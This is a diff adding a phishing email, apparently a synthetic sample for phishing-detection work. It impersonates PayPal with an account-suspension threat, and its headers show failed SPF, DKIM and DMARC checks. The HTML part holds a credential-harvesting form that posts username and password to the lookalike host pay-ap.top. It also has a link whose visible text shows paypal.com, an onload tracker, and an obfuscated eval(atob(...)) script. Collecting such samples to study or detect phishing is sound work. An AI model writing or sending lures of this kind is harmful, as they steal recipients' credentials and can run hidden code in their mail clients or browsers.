@@ -1,0 +1,35 @@
+From: notice@pay-ap.top
+To: victim0@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 20 Mar 2002 17:29:00 -0500
+Message-ID: <phish-240-ff85ef4f-d972-4343-95e2-a23e56826534@pay-ap.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 07 Mar 2002 11:21:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 26 Mar 2002 15:33:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 02 Mar 2002 05:36:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 21 Mar 2002 10:35:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 08 Mar 2002 15:06:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 11 Mar 2002 16:55:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 01 Mar 2002 02:35:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 16 Mar 2002 13:20:00 -0500
+Return-Path: <bounce@mail-1fbd33db.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-1fbd33db.top; dkim=fail header.d=pay-ap.top; dmarc=fail header.from=pay-ap.top
+Received-SPF: fail (mx.example.com: domain of notice@pay-ap.top does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=pay-ap.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-240-c1662e9c"
+
+--bnd-p-240-c1662e9c
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://pay-ap.top/login
+
+Reference: P0215F0
+--bnd-p-240-c1662e9c
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://pay-ap.top/login<br/><br/>Reference: P0215F0</p><p><a href="http://pay-ap.top/login">https://www.paypal.com/signin</a></p><form action="http://pay-ap.top/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-240-c1662e9c--
